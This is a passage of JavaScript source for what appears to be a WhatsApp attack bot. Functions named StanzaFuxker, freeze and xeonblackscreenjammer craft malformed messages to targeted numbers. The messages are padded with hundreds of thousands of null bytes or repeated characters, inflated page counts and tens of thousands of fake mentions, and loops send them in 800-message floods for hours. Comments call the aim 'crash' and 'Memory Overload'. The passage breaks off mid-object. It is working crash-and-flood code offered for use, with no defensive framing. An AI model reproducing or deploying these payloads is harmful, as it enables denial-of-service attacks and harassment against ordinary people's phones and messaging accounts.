async function CursorCrL2(isTarget) {
  const msg = await generateWAMessageFromContent(isTarget, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: '' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: '𓅓 ANUGA SENITHU丨💦' ,
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: "164089",
                    height: 1,
                    width: 1,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAsAAEAAwEBAAAAAAAAAAAAAAAAAQIDBAUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAADxq2mzNeJZZovmEJV0RlAX6F5I76JxgAtN5TX2/G0X2MfHzjq83TOgNteXpMpujBrNc6wquimpWoKwFaEsA//EACQQAAICAgICAQUBAAAAAAAAAAABAhEDIQQSECAUEyIxMlFh/9oACAEBAAE/ALRR1OokNRHIfiMR6LTJNFsv0g9bJvy1695G2KJ8PPpqH5RHgZ8lOqTRk4WXHh+q6q/SqL/iMHFyZ+3VrRhjPDBOStqNF5GvtdQS2ia+VilC2lapM5fExYIWpO78pHQ43InxpOSVpk+bJtNHzM6n27E+Tlk/3ZPLkyUpSbrzDI0qVFuraG5S0fT1tlf6dX6RdEZWt7P2f4JfwUdkqGijXiA9OkPQh+n/xAAXEQADAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/ANVukaO//8QAFhEAAwAAAAAAAAAAAAAAAAAAARBA/9oACAEDAQE/AJg//9k=",
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493]
                  },
                  hasMediaAttachment: true, 
                },
                body: { 
                  text: ""
                },
                footer: {
                  text: "𓅓 ANUGA SENITHU丨💦"
                },
                nativeFlowMessage: {
                  messageParamsJson: "\n".repeat(10000) 
                }
              }
            ]
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",             
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "{ Brando_Da.js }",
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "status@broadcast"
          }
        }
      }
    }
  }, {});

  await XeonBotInc.relayMessage(isTarget, msg.message, {
    participant: { jid: isTarget },
    messageId: msg.key.id
  });
}
async function invisSqL(isTarget) {
  const Node = [
    {
      tag: "bot",
      attrs: {
        biz_bot: "1"
      }
    }
  ];

  const msg = generateWAMessageFromContent(isTarget, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16)
          })
        },
        interactiveMessage: {
          header: {
            title: "🧪↭ANUGA SENITHU丨↭",
            hasMediaAttachment: false,
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "NzsD1qquqQAeJ3MecYvGXETNvqxgrGH2LaxD8ALpYVk=",
              fileLength: "11887",
              height: 1080,
              width: 1080,
              mediaKey: "H/rCyN5jn7ZFFS4zMtPc1yhkT7yyenEAkjP0JLTLDY8=",
              fileEncSha256: "RLs/w++G7Ria6t+hvfOI1y4Jr9FDCuVJ6pm9U3A2eSM=",
              directPath: "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1750124469",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEAAwEBAAAAAAAAAAAAAAAAAQMEBQYBAQEBAQAAAAAAAAAAAAAAAAACAQP/2gAMAwEAAhADEAAAAPMgAAAAAb8F9Kd12C9pHLAAHTwWUaubbqoQAA3zgHWjlSaMswAAAAAAf//EACcQAAIBBAECBQUAAAAAAAAAAAECAwAREhMxBCAQFCJRgiEwQEFS/9oACAEBAAE/APxfKpJBsia7DkVY3tR6VI4M5Wsx4HfBM8TgrRWPPZj9ebVPK8r3bvghSGPdL8RXmG251PCkse6L5DujieU2QU6TcMeB4HZGLXIB7uiZV3Fv5qExvuNremjrLmPBba6VEMkQIGOHqrq1VZbKBj+u0EigSODWR96yb3NEk8n7n//EABwRAAEEAwEAAAAAAAAAAAAAAAEAAhEhEiAwMf/aAAgBAgEBPwDZsTaczAXc+aNMWsyZBvr/AP/EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8AT//Z",
              contextInfo: {
                mentionedJid: [isTarget],
                participant: isTarget,
                remoteJid: isTarget,
                expiration: 9741,
                ephemeralSettingTimestamp: 9741,
                entryPointConversionSource: "WhatsApp.com",
                entryPointConversionApp: "WhatsApp",
                entryPointConversionDelaySeconds: 9742,
                disappearingMode: {
                  initiator: "INITIATED_BY_OTHER",
                  trigger: "ACCOUNT_SETTING"
                }
              },
              scansSidecar: "E+3OE79eq5V2U9PnBnRtEIU64I4DHfPUi7nI/EjJK7aMf7ipheidYQ==",
              scanLengths: [2071, 6199, 1634, 1983],
              midQualityFileSha256: "S13u6RMmx2gKWKZJlNRLiLG6yQEU13oce7FWQwNFnJ0="
            }
          },
          body: {
            text: "🧪↭ANUGA SENITHU丨↭"
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000)
          }
        }
      }
    }
  }, {});

  await XeonBotInc.relayMessage(isTarget, msg.message, {
    participant: { jid: isTarget },
    additionalNodes: Node,
    messageId: msg.key.id
  });
}
async function InVisibleX(X, show) {
            let msg = await generateWAMessageFromContent(X, {
                buttonsMessage: {
                    text: "Telegram : ANUWH4YOU",
                    contentText:
                        "Telegram : ANUWH4YOU",
                    footerText: "Telegram : ANUWH4YOU",
                    buttons: [
                        {
                            buttonId: ".aboutb",
                            buttonText: {
                                displayText: "Telegram : ANUWH4YOU" + "\u0000".repeat(500000),
                            },
                            type: 1,
                        },
                    ],
                    headerType: 1,
                },
            }, {});
        
            await XeonBotInc.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [X],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: X },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
        
            if (show) {
                await XeonBotInc.relayMessage(
                    X,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: {
                                    is_status_mention: "Telegram : ANUWH4YOU",
                                },
                                content: undefined,
                            },
                        ],
                    }
                );
            }            
        }
        
    async function sendMessagesForDurationX(durationHours, X) {
    const totalDurationMs = durationHours * 60 * 60 * 1000; // Convert hours to milliseconds
    const startTime = Date.now();
    let count = 0;

    const sendNext = async () => {
        if (Date.now() - startTime >= totalDurationMs) {
            console.log("Delivery Completed Within Specified Duration.");
            return;
        }

        if (count < 800) {
            await xjammer(X); // Using X from user input
            count++;
            await sendNext(); // Continue shipping
        } else {
            console.log(chalk.green(`Completed Sending 800 Packages To ${X}`)); // Log completed sending 800 packages
            count = 0; // Reset for next package
            console.log(chalk.red("Preparing To Ship The Next 800 Packages..."));
            setTimeout(sendNext, 5000); // Pause 5 seconds after completion of batch of 800 messages
        }
    };

    sendNext();
};

async function sendMessagesForDuration(durationHours, X) {
    const totalDurationMs = durationHours * 60 * 60 * 1000; // Convert hours to milliseconds
    const startTime = Date.now();
    let count = 0;

    const sendNext = async () => {
        if (Date.now() - startTime >= totalDurationMs) {
            console.log("Delivery Completed Within Specified Duration.");
            return;
        }

        if (count < 800) {
            await xjammer2(X); // Using X from user input
            count++;
            await sendNext(); // Continue delivery without delay between messages
        } else {
            console.log(chalk.green(`Completed Sending 800 Packages To ${X}`)); // Log selesai kirim 800 paket
            count = 0; // Reset for next package
            console.log(chalk.red("Preparing To Ship The Next 800 Packages..."));
            setTimeout(sendNext, 5000); // Pause 5 seconds after completion of batch of 800 messages
        }
    };

    sendNext();
};

async function DelayInVis(X, show) {
            let push = [];
                push.push({
                    body: proto.Message.InteractiveMessage.Body.fromObject({ text: " " }),
                    footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: " " }),
                    header: proto.Message.InteractiveMessage.Header.fromObject({
                        title: " ",
                        hasMediaAttachment: true,
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            fileSha256: "88J5mAdmZ39jShlm5NiKxwiGLLSAhOy0gIVuesjhPmA=",
                            fileLength: "18352",
                            height: 720,
                            width: 1280,
                            mediaKey: "Te7iaa4gLCq40DVhoZmrIqsjD+tCd2fWXFVl3FlzN8c=",
                            fileEncSha256: "w5CPjGwXN3i/ulzGuJ84qgHfJtBKsRfr2PtBCT0cKQQ=",
                            directPath: "/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1737281900",
                            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACgASAMBIgACEQEDEQH/xAAsAAEBAQEBAAAAAAAAAAAAAAAAAwEEBgEBAQEAAAAAAAAAAAAAAAAAAAED/9oADAMBAAIQAxAAAADzY1gBowAACkx1RmUEAAAAAA//xAAfEAABAwQDAQAAAAAAAAAAAAARAAECAyAiMBIUITH/2gAIAQEAAT8A3Dw30+BydR68fpVV4u+JF5RTudv/xAAUEQEAAAAAAAAAAAAAAAAAAAAw/9oACAECAQE/AH//xAAWEQADAAAAAAAAAAAAAAAAAAARIDD/2gAIAQMBAT8Acw//2Q==",
                            scansSidecar: "hLyK402l00WUiEaHXRjYHo5S+Wx+KojJ6HFW9ofWeWn5BeUbwrbM1g==",
                            scanLengths: [3537, 10557, 1905, 2353],
                            midQualityFileSha256: "gRAggfGKo4fTOEYrQqSmr1fIGHC7K0vu0f9kR5d57eo=",
                        },
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({ buttons: [] }),
                });
        
            let msg = await generateWAMessageFromContent(
                X,
                {
                    viewOnceMessage: {
                        message: {
                            messageContextInfo: {
                                deviceListMetadata: {},
                                deviceListMetadataVersion: 2,
                            },
                            interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                                body: proto.Message.InteractiveMessage.Body.create({ text: " " }),
                                footer: proto.Message.InteractiveMessage.Footer.create({ text: "bijiku" }),
                                header: proto.Message.InteractiveMessage.Header.create({ hasMediaAttachment: false }),
                                carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ cards: [...push] }),
                            }),
                        },
                    },
                },
                {}
            );
        
            await XeonBotInc.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [X],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: X },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
        
            if (show) {
                await XeonBotInc.relayMessage(
                    X,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: { is_status_mention: "Telegram : ANUWH4YOU" },
                                content: undefined,
                            },
                        ],
                    }
                );
            }
        }
        
//==============================================================\\
async function StanzaFuxker(target, ptcp = true) {
  const virtex = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];

  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "Telegram : ANUWH4YOU" + "".repeat(16999), 
          listType: 2,
          singleSelectReply: {
            selectedRowId: "",
          },
          contextInfo: {
            virtexId: XeonBotInc.generateMessageTag(),
            participant: "5521992999999@s.whatsapp.net",
            mentionedJid: "5521992999999@s.whatsapp.net",
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://example.com/largefile",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999", // Large file size
                  pageCount: 1316134911,  // Max page count to slow down memory
                  mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                  fileName: "Telegram : ANUWH4YOU" + "".repeat(97770),
                  fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                  directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1726867151",
                  contactVcard: true,
                  jpegThumbnail: "",
                },
                hasMediaAttachment: true,
                contentText: 'Telegram : ANUWH4YOU',
                footerText: "Telegram : ANUWH4YOU",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(170000),
                    buttonText: {
                      displayText: "Telegram : ANUWH4YOU" + "".repeat(1999),
                    },
                    type: 1,
                  },
                  {
                    buttonId: "\u0000".repeat(220000),
                    buttonText: {
                      displayText: "Telegram : ANUWH4YOU" + "".repeat(1999),
                    },
                    type: 1,
                  },
                  {
                    buttonId: "\u0000".repeat(220000),
                    buttonText: {
                      displayText: "Telegram : ANUWH4YOU" + "".repeat(1999),
                    },
                    type: 1,
                  },
                ],
                viewOnce: true,
                headerType: 3,
              },
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
            entryPointConversionSource: "Telegram : ANUWH4YOU",
            entryPointConversionApp: "Telegram : ANUWH4YOU",
            actionLink: {
              url: "t.me/DGXeon13",
              buttonTitle: "Telegram : ANUWH4YOU",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatorDeviceJid: target,
              initiatedByMe: true,
            },
            groupSubject: "Telegram : ANUWH4YOU",
            parentGroupJid: "Telegram : ANUWH4YOU",
            trustBannerType: "Telegram : ANUWH4YOU",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {},
          },
          description: "".repeat(29999),
        },
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16),
          }),
        },
      },
    },
  };

  let sections = [];
  for (let i = 0; i < 40; i++) {  
    let largeText = "\u0000".repeat(11999);  
    let deepNested = {
      title: `Section ${i + 1}`,
      highlight_label: `Highlight ${i + 1}`,
      rows: [
        {
          title: largeText,
          id: `\u0000`.repeat(999),
          subrows: [
            {
              title: `\u0000`.repeat(999),
              id: `\u0000`.repeat(999),
              subsubrows: [
                {
                  title: `\u0000`.repeat(999),
                  id: `\u0000`.repeat(999),
                },
                {
                  title: `\u0000`.repeat(999),
                  id: `\u0000`.repeat(999),
                },
              ],
            },
            {
              title: `\u0000`.repeat(999),
              id: `\u0000`.repeat(999),
            },
          ],
        },
      ],
    };
    sections.push(deepNested);
  }

  let listMessage = {
    title: "".repeat(70000),
    sections: sections,
  };

  let msg = generateWAMessageFromContent(
    target,
    proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: proto.Message.InteractiveMessage.create({
            contextInfo: {
              participant: "5521992999999@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
            },
            body: proto.Message.InteractiveMessage.Body.create({
              text: 'Telegram : ANUWH4YOU' + "".repeat(29999),
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              buttonParamsJson: JSON.stringify(listMessage),
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              buttonParamsJson: JSON.stringify(listMessage),
              subtitle: "zhee crash" + "\u0000".repeat(9999),
              hasMediaAttachment: false,
            }),
            nativeFlowMessage:
              proto.Message.InteractiveMessage.NativeFlowMessage.create({
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "{}",
                  },
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                ],
              }),
          }),
        },
      },
    }),
    { userJid: target }
  );
  
  await XeonBotInc.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });

  console.log(`Payload sent to ${target} - Overload complete`);

  await XeonBotInc.relayMessage(target, messagePayload, {
    additionalNodes: virtex,
    participant: { jid: target },
  });
  
  console.log(`Message sent to ${target} - Memory Overload`);
}
//==============================================================\\
let push = [];
let buttt = [];
for (let i = 0; i < 1000; i++) {push.push({body: proto.Message.InteractiveMessage.Body.fromObject({text: "ㅤ"}),footer: proto.Message.InteractiveMessage.Footer.fromObject({text: "ㅤㅤ"}),header: proto.Message.InteractiveMessage.Header.fromObject({title: '\n', hasMediaAttachment: true,"imageMessage": {"url": "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true","mimetype": "image/jpeg","fileSha256": "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=","fileLength": "10840","height": 10,"width": 10,"mediaKey": "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=","fileEncSha256": "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=","directPath": "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0","mediaKeyTimestamp": "1721344123","jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECECFBMTJRUv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",}}),nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({"buttons": [] })});}
const carousel = generateWAMessageFromContent(from, {viewOnceMessage: {message: {messageContextInfo: {deviceListMetadata: {},deviceListMetadataVersion: 2},interactiveMessage: proto.Message.InteractiveMessage.fromObject({body: proto.Message.InteractiveMessage.Body.create({text: "Telegram : ANUWH4YOU "}),footer: proto.Message.InteractiveMessage.Footer.create({text: global.namabot}),header: proto.Message.InteractiveMessage.Header.create({hasMediaAttachment: false}),carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({cards: [...push]})})}}}, {});
const stanza = [{attrs: { biz_bot: '1' },tag: "bot",},{attrs: {},tag: "biz",},];
async function xgc4(target) {
            try {
                const messsage = {
                    botInvokeMessage: {
                        message: {
                            newsletterAdminInviteMessage: {
                                newsletterJid: '33333333333333333@newsletter',
                                newsletterName: "Telegram : ANUWH4YOU" + "ꦾ".repeat(120000),
                                jpegThumbnail: "",
                                caption: "ꦽ".repeat(120000),
                                inviteExpiration: Date.now() + 1814400000,
                            },
                        },
                    },
                };
                await XeonBotInc.relayMessage(target, messsage, {
                    userJid: target,
                });
            }
            catch (err) {
                console.log(err);
            }
        }
const { bug } = require('./69/bug.js');
const { bugUrl } = require('./69/bugUrl.js')
//==============================================================\\
async function xeoninvidelay(isTarget, mention) {
  let msg = await generateWAMessageFromContent(isTarget, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32)
        },
        interactiveResponseMessage: {
          body: {
            text: " ",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "flex_agency",
            paramsJson: "\u0000".repeat(999999),
            version: 3
          },
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9999,
            forwardedNewsletterMessageInfo: {
              newsletterName: " ",
              newsletterJid: "120363330344810280@newsletter",
              serverMessageId: 1
            }
          }
        }
      }
    }
  }, {});

  await XeonBotInc.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: isTarget }, content: undefined }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await XeonBotInc.relayMessage(isTarget, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            type: 25
          },
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: " " },
              content: undefined
            }
          ]
        }
      }
    }, {});
  }
}
//==============================================================\\
async function xeonblackscreenjammer(target){
  const msg = generateWAMessageFromContent(target, {
    locationMessage: {
        degreesLatitude: 0,
        degreesLongitude: 0,
        name: "Telegram : ANUWH4YOU",
        url: bugUrl,
        isLive: true,
        contextInfo: {
            forwardingScore: 508,
            isForwarded: true,
            fromMe: false,
            participant: '0@s.whatsapp.net',
            remoteJid: sender,
            quotedMessage: {
                documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/34673265_965442988481988_3759890959900226993_n.enc?ccb=11-4&oh=01_AdRGvYuQlB0sdFSuDAeoDUAmBcPvobRfHaWRukORAicTdw&oe=65E730EB&_nc_sid=5e03e0&mms3=true",
                    mimetype: "application/pdf",
                    title: "crash",
                    pageCount: 1000000000,
                    fileName: "crash.pdf",
                    contactVcard: true
                }
            },
            forwardedNewsletterMessageInfo: {
                newsletterJid: '120363399531796033@newsletter',
                serverMessageId: 1,
                newsletterName: " " + bug + bug
            },
            externalAdReply: {
                title: ' Telegram : ANUWH4YOU ',
                body: 'Telegram : ANUWH4YOU',
                mediaType: 0,
                thumbnail: m,
                jpegThumbnail: m,
                mediaUrl: `https://www.youtube.com/@dgxeon`,
                sourceUrl: `https://www.youtube.com/@dgxeon`
            }
        }
    }
}, {});
await XeonBotInc.relayMessage(target, carousel.message, { quoted: carousel.key.id, participant: { jid: target }});
await XeonBotInc.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target }
});
}
//==============================================================\\
async function freeze(target) {
    await XeonBotInc.relayMessage(target, {
      stickerPackMessage: {
        stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
        name: "SPIDER 🕷️🕸️- StickerPack" + "ꦾ".repeat(70000),
        publisher: "SPIDER 🕷️ 🕸️ Mp4",
        stickers: [
          { fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
          { fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
          { fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
          { fileName: "qDsm3SVPT6UhbCM7SCtCltGhxtSwYBH06KwxLOvKrbQ=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
          { fileName: "gcZUk942MLBUdVKB4WmmtcjvEGLYUOdSimKsKR0wRcQ=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
          { fileName: "1vLdkEZRMGWC827gx1qn7gXaxH+SOaSRXOXvH+BXE14=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "Jawa Jawa", isLottie: false, mimetype: "image/webp" },
          { fileName: "dnXazm0T+Ljj9K3QnPcCMvTCEjt70XgFoFLrIxFeUBY=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
          { fileName: "gjZriX-x+ufvggWQWAgxhjbyqpJuN7AIQqRl4ZxkHVU=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" }
        ],
        fileLength: "3662919",
        fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
        fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
        mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
        directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
        contextInfo: {
          remoteJid: "X",
          participant: "0@s.whatsapp.net",
          stanzaId: "1234567890ABCDEF",
          mentionedJid: [
            "6285215587498@s.whatsapp.net",
            ...Array.from({ length: 25000 }, () =>
                `${Math.floor(Math.random() * 999999)}@s.whatsapp.net`
            )
          ]
        },
        packDescription: "",
        mediaKeyTimestamp: "1747502082",
        trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
        thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
        thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
        thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
        thumbnailHeight: 252,
        thumbnailWidth: 252,
